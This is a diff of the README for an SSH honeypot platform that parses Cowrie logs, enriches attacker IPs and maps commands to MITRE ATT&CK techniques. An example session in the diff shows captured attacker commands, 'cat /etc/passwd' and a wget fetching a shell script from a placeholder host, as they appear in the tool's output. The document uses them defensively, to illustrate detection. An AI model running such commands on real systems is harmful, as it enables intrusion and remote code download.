@@ -2,26 +2,40 @@
 
 **An SSH honeypot platform that turns raw attacker activity into structured, enriched, ATT&CK-mapped intelligence.**
 
-Surya Kundal runs a [Cowrie](https://github.com/cowrie/cowrie) SSH honeypot, reconstructs every attacker visit as a structured session, and stores it in a queryable database. The planned phases add per-IP threat-intelligence enrichment, mapping of attacker commands to MITRE ATT&CK techniques, Wazuh SIEM alerting, and a live dashboard.
+Surya Kundal runs a [Cowrie](https://github.com/cowrie/cowrie) SSH honeypot, reconstructs every attacker visit as a structured session, enriches each source IP and captured file with threat intelligence, maps what the attacker did to MITRE ATT&CK techniques, and stores it all in a queryable database. Wazuh SIEM alerting and a live dashboard are the next phases.
 
-> **Status:** early development. Capture, session reconstruction, live storage, and the command-line tools work today. Enrichment, ATT&CK mapping, Wazuh integration, and the dashboard are not built yet. The table below is explicit about which is which.
+> **Status:** active development. Capture, storage, enrichment, ATT&CK mapping, and the command-line tools work today and are covered by an automated test suite. The Wazuh rules, dashboard, containerised deployment, and public deployment are not built yet; the table below is explicit about which is which.
 
 ## Why this exists
 
 A honeypot's native output is a flat stream of events: one JSON line per connection, key exchange, login attempt, and command. That is hard to turn into answers to the questions that matter: *who is this, what technique are they using, and how dangerous is it?* Surya Kundal is the analysis layer on top of the honeypot that answers them.
+
+```
+$ surya-kundal show 051b
+Session 051b29d11c6c from 203.0.113.7 at 2026-10-05 07:11:23 UTC
+  login rejected: root/123456
+  login accepted: root/apple
+  T1078.001 login-default-account (medium): login accepted for 'root'
+  $ whoami
+      -> T1033 discovery-current-user (high)
+  $ cat /etc/passwd
+      -> T1087.001 discovery-local-accounts (high)
+  $ wget http://example.com/test/sh
+      -> T1105 c2-download (high)
+```
 
 ## Capabilities
 
 | Capability | Status |
 |---|---|
 | SSH honeypot capture (Cowrie) | Working |
-| Session reconstruction from the event stream: credentials tried, commands typed, files downloaded (with SHA-256), timing, client version, HASSH fingerprint | Working |
-| Durable SQLite storage with idempotent, failure-isolated import | Working |
-| Live log following: events are stored within a second of being written, across log rotation | Working |
-| `surya-kundal ingest` / `watch` / `list` / `enrich` / `geoip` command-line tools | Working |
-| Offline IP geolocation and ASN lookup (MaxMind GeoLite2) with a safe, validated database updater: `surya-kundal geoip update` / `geoip lookup` | Working |
-| Threat-intelligence enrichment: AbuseIPDB score per attacker IP, Tor exit-node check, VirusTotal verdict per downloaded file. Each IP and hash is looked up once and cached; daily budgets stay under free-tier limits and survive restarts. `surya-kundal enrich` | Working (live API check pending) |
-| MITRE ATT&CK technique mapping of attacker commands and logins: 70+ reviewable rules, each with its own pass/fail examples, validated against the official ATT&CK catalog. `surya-kundal map` / `techniques` / `show` | Working |
+| Session reconstruction: credentials, commands, files downloaded and uploaded (SHA-256), port-forwarding attempts, timing, SSH client version, HASSH fingerprint | Working |
+| Durable SQLite storage with idempotent, failure-isolated import and versioned schema migrations (Alembic) | Working |
+| Live log following across rotation; failed database writes are retried, never dropped | Working |
+| Offline IP geolocation and ASN (MaxMind GeoLite2) with a validated, atomic database updater | Working |
+| Threat-intel enrichment: AbuseIPDB score and Tor exit-node check per IP, VirusTotal verdict per captured file. Each IP and hash is looked up once; daily budgets stay under free-tier limits and survive restarts | Working |
+| MITRE ATT&CK mapping of commands, logins, transfers and tunnelling: 70+ reviewable rules, each with its own pass/fail examples, validated against the official ATT&CK catalog | Working |
+| One-process service (`surya-kundal run`): capture, ATT&CK mapping, background enrichment | Working |
 | Wazuh SIEM rules for high-risk behaviour | Planned |
 | Web dashboard: live feed, attack map, ATT&CK heatmap, session drill-down | Planned |
 | One-command deployment with Docker Compose | Planned |
@@ -34,17 +48,21 @@ Internet / attacker
         |
   [Cowrie SSH honeypot]          cowrie.json (one JSON event per line)
         |
-  [Log parser]                   groups events into one record per session
+  [Watcher / log parser]         groups events into one record per session
         |
-  [Enrichment]                   free-tier and offline sources (provider list finalised in Phase 3)
+  [SQLite via SQLAlchemy]        sessions, logins, commands, downloads, uploads, tunnels
         |
-  [ATT&CK mapper]                command -> technique ID (e.g. T1105)
-        |
-  [SQLite via SQLAlchemy]        sessions, logins, commands, downloads (+ intel, mappings later)
-        |
-  +-----+------------------+
-  |                        |
-[Wazuh rules]        [Flask dashboard]
+  +-----+-----------------------+
+  |                             |
+[ATT&CK mapper]          [Enrichment worker]
+ command -> technique     GeoLite2, AbuseIPDB, Tor list, VirusTotal
+  |                             |
+  +-----------+-----------------+
+              |
+   +----------+-----------+
+   |                      |
+[Wazuh rules]      [Flask dashboard]
+   (planned)           (planned)
 ```
 
 Everything from the log parser onward is code in this repository. Cowrie itself is used unmodified as the capture engine.
@@ -53,30 +71,34 @@ Everything from the log parser onward is code in this repository. Cowrie itself 
 
 | Table | One row per | Key fields |
 |---|---|---|
-| `sessions` | attacker visit | Cowrie session ID, source IP, start/end time, duration, SSH client version, HASSH |
-| `logins` | credential attempt | username, password, success flag, timestamp |
-| `commands` | command typed | command text, timestamp (read back in chronological order) |
-| `downloads` | file fetched by the attacker | URL, SHA-256, timestamp |
+| `sessions` | attacker visit | Cowrie session ID, source IP, start/end, duration, SSH client version, HASSH |
+| `logins` | credential attempt | username, password, success flag |
+| `commands` | command typed | command text, timestamp |
+| `downloads` | file the attacker fetched | URL, SHA-256 |
+| `uploads` | file the attacker sent (SFTP/SCP) | filename, destination, SHA-256 |
+| `tunnel_requests` | port-forwarding attempt | destination and origin address and port |
 | `ip_geo` | attacker IP | country, city, coordinates, ASN and organisation |
 | `ip_intel` | IP per provider | AbuseIPDB confidence score, Tor exit flag, raw provider payload |
 | `file_intel` | file hash per provider | VirusTotal detections, engine count, threat label |
-| `technique_matches` | rule that fired | ATT&CK technique and tactics, rule ID, confidence, the evidence text, linked to the command |
+| `technique_matches` | rule that fired | ATT&CK technique and tactics, rule ID, confidence, evidence, linked command |
 | `session_mappings` | mapped session | which rule set and ATT&CK version produced the matches |
+
+## ATT&CK mapping
+
+Attacker commands are split into simple commands (respecting quotes), stripped of wrappers like `sudo` and `/usr/bin/`, and matched against the rules in [`rules.toml`](src/surya_kundal/mapping/rules.toml). Session-level evidence maps too: repeated failed logins to password guessing, accepted default-account logins, file transfers to ingress tool transfer, port forwarding to proxy use. Every rule states its technique, a confidence level, and examples that must and must not match; the test suite enforces all of them, and every technique ID is checked against the vendored ATT&CK Enterprise catalog (v19). Sessions are re-mapped automatically when their activity or the rules change.
+
+This is pattern matching, not a shell interpreter: it does not follow variables or decode payloads, and confidence describes how specific a pattern is, not how dangerous a command is.
 
 ## Engineering approach
 
-What is in place today:
-
-- **Additive, idempotent storage.** Sessions are merged into the database, never rewritten. Importing the same log twice creates no duplicates, a session saved mid-attack is completed when its closing events arrive, a partial view can never destroy data already stored, and row IDs stay stable so later tables can reference them. Event identity is enforced with unique constraints in the database itself.
-- **A watcher built for real log files.** It copes with log rotation (including a session split across two files), truncation, a half-written last line, and a log that does not exist yet. It shuts down cleanly on `SIGINT`/`SIGTERM`, and a restart safely replays the log.
-- **Failure isolation.** A malformed log line is skipped, a session that fails to save is logged without aborting the rest, and an unexpected error in one watch cycle does not stop the service.
-- **Correct time handling.** Timestamps are stored and returned as timezone-aware UTC. SQLite returns naive datetimes by default, so a custom column type enforces this.
-- **Database integrity.** Foreign keys are enforced (SQLite ignores them unless enabled) and WAL mode lets a reader, such as the dashboard, work while the importer writes.
-- **Typed SQLAlchemy 2.0 models** and a clean `src/` package layout, installable with `pip`.
-- **Tests built on real data.** The suite covers the parser, storage, import, and CLI, using events taken from a real captured session.
-- **CI.** Every push runs ruff (lint and format check) and pytest on Python 3.11 and 3.13.
-
-Planned alongside the later phases: secrets only through the environment, API rate limiting and quota management, per-IP intel caching, and a containerised deployment with outbound traffic restricted on the honeypot host.
+- **Additive, idempotent storage.** Sessions are merged into the database, never rewritten. Importing the same log twice creates no duplicates, a session saved mid-attack is completed when its closing events arrive, and row IDs stay stable. Event identity is enforced by unique constraints in the database itself.
+- **Migrations.** The schema is versioned with Alembic. Databases from before migrations existed upgrade in place, and a test fails if a model changes without a migration.
+- **A watcher built for real log files.** It copes with rotation (including a session split across two files), truncation, a half-written last line, and a missing log. It retries failed database writes and shuts down cleanly on `SIGINT`/`SIGTERM`.
+- **Treats attacker input as hostile.** Everything an attacker types is untrusted. Output is escaped before it reaches a terminal (control characters and right-to-left overrides), and the mapper bounds the length of every command it analyses so crafted input cannot cause pathological regular-expression run time. Property-based tests (Hypothesis) throw arbitrary text, JSON and control characters at the parser, mapper and sanitiser.
+- **Free-tier discipline.** Every IP and file hash is looked up once and cached. Daily budgets are tracked in the database, so they survive restarts. A provider that reports its limit stops being called, and a failure on one item never blocks the rest.
+- **Secrets.** Read only from the environment or an untracked `.env` (which triggers a warning if other users can read it). HTTP clients never log request URLs, and the MaxMind downloader does not forward credentials across redirects.
+- **Correct time handling and database integrity.** Timestamps are timezone-aware UTC end to end; foreign keys are enforced and WAL mode lets a reader work while the importer writes.
+- **Quality gates in CI.** Every push runs the test suite on Python 3.11, 3.13 and 3.14 (95% coverage, 90% floor, resource leaks fail the run), ruff lint and format with security rules, strict mypy, a job that builds the wheel and runs it from a clean environment, `pip-audit`, and CodeQL. Dependabot keeps dependencies current.
 
 ## Getting started
 
@@ -88,25 +110,33 @@ cd SuryaKundal
 python3 -m venv .venv
 source .venv/bin/activate
 pip install -e ".[dev]"
-pytest -v
+pytest
 ```
 
-Import an existing Cowrie log, then look at what was captured:
+Configuration is read from the environment or a `.env` file; copy `.env.example` and fill in what you have (all API keys are optional, and missing ones are skipped):
 
 ```bash
-surya-kundal ingest --log ~/cowrie/var/log/cowrie/cowrie.json
-surya-kundal list
+cp .env.example .env && chmod 600 .env
+surya-kundal geoip update          # one-off: download the GeoLite2 databases
 ```
 
-Or follow the log live and store events as Cowrie writes them (stop with Ctrl+C):
+Run the whole pipeline (capture, ATT&CK mapping, background enrichment); stop with Ctrl+C:
 
 ```bash
-surya-kundal watch --log ~/cowrie/var/log/cowrie/cowrie.json
+surya-kundal run
 ```
 
-`watch` starts from the top of the log by default, which is safe because storage is idempotent. Add `--from-end` to store only new events.
+Or use the pieces separately:
 
-The database location comes from `DATABASE_URL` (default `sqlite:///data/surya_kundal.db`). See `.env.example` for all settings.
+```bash
+surya-kundal ingest                # import an existing Cowrie log
+surya-kundal watch --from-end      # follow the log live, store only new events
+surya-kundal map                   # map sessions to ATT&CK techniques
+surya-kundal enrich                # geolocation + threat intel
+surya-kundal list                  # recent sessions with country, abuse score, Tor flag
+surya-kundal techniques            # ATT&CK techniques seen, most common first
+surya-kundal show <session-id>     # one session: commands with their techniques
+```
 
 ## Roadmap
 
@@ -115,7 +145,7 @@ The database location comes from `DATABASE_URL` (default `sqlite:///data/surya_k
 | 0 | Repo skeleton, tests, CI | Done |
 | 1 | Cowrie running, log parser | Done |
 | 2 | Database layer and live log watcher | Done |
-| 3 | Threat-intel enrichment with caching and rate limits | Built; live API verification in progress |
+| 3 | Threat-intel enrichment with caching and rate limits | Done |
 | 4 | MITRE ATT&CK mapping engine | Done |
 | 5 | Wazuh custom rules | Planned |
 | 6 | Flask dashboard | Planned |
@@ -123,24 +153,25 @@ The database location comes from `DATABASE_URL` (default `sqlite:///data/surya_k
 | 8 | Deploy to a cloud VM and collect real attacker data | Planned |
 | 9 | Write-up, demo, documentation | Planned |
 
-Only free tiers and free offline datasets are used. No paid services are required. Free-tier limits are checked against each provider's own documentation before a provider is adopted.
+Only free tiers and free offline datasets are used. No paid services are required.
 
 ## Project layout
 
 ```
 src/surya_kundal/
     parser/        Cowrie log parsing
-    database/      SQLAlchemy models, engine setup, storage
+    database/      SQLAlchemy models, engine, storage, Alembic migrations
     enrichment/    GeoIP, AbuseIPDB, VirusTotal, Tor list, enrichment pass
     mapping/       ATT&CK catalog, rules.toml, mapping engine
     dashboard/     Flask web UI (Phase 6)
-    ingest.py      Log import orchestration
+    watcher.py     Live log following
+    service.py     The one-process pipeline behind `surya-kundal run`
+    config.py      Settings (environment and .env)
+    textsafe.py    Safe printing of attacker-controlled text
     cli.py         surya-kundal command
 wazuh/             Custom Wazuh rules (Phase 5)
 cowrie/            Notes on our Cowrie configuration
-tests/             pytest suite
-pyproject.toml     Packaging, dependencies, ruff and pytest config
-.env.example       Required environment variables
+tests/             pytest suite (unit, property-based, migration, CLI)
 ```
 
 `docker-compose.yml` is added in Phase 7, once there is a real stack to orchestrate.
@@ -149,16 +180,8 @@ pyproject.toml     Packaging, dependencies, ruff and pytest config
 
 This product includes GeoLite2 data created by MaxMind, available from [https://www.maxmind.com](https://www.maxmind.com). Run `surya-kundal geoip update` with a free MaxMind account (set `MAXMIND_ACCOUNT_ID` and `MAXMIND_LICENSE_KEY` in `.env`). The databases are git-ignored and must not be redistributed; GeoLite2 city-level locations are approximate.
 
-## ATT&CK mapping
-
-Attacker commands are split into simple commands (respecting quotes), stripped of wrappers like `sudo` and `/usr/bin/`, and matched against the rules in [`rules.toml`](src/surya_kundal/mapping/rules.toml). Session-level evidence such as repeated failed logins maps to password guessing. Every rule states its technique, a confidence level, and examples that must and must not match; the test suite enforces all of them, and every technique ID is checked against the vendored ATT&CK Enterprise catalog (v19). Sessions are re-mapped automatically when their commands or the rules change.
-
-This is pattern matching, not a shell interpreter: it does not follow variables or decode payloads, and confidence describes how specific a pattern is, not how dangerous a command is.
-
 MITRE ATT&CK(R) is a registered trademark of The MITRE Corporation. Technique data is from the Enterprise ATT&CK dataset, (c) The MITRE Corporation, reproduced with permission.
 
-## Security notes
+## Security
 
-- Honeypot logs, captured malware samples, databases, and `.env` files are git-ignored. Never commit them.
-- When deployed on the public internet, outbound traffic from the honeypot host must be restricted. Cowrie performs real downloads when an attacker runs `wget` or `curl`.
-- Run the honeypot on an isolated host or network, never alongside real services.
+See [`SECURITY.md`](SECURITY.md) for how to report a vulnerability and the design choices that matter. In short: honeypot logs, captured malware, databases and `.env` files are git-ignored; when deployed on the public internet, outbound traffic from the honeypot host must be restricted (Cowrie performs real downloads when an attacker runs `wget`); and the honeypot belongs on an isolated host, never alongside real services.
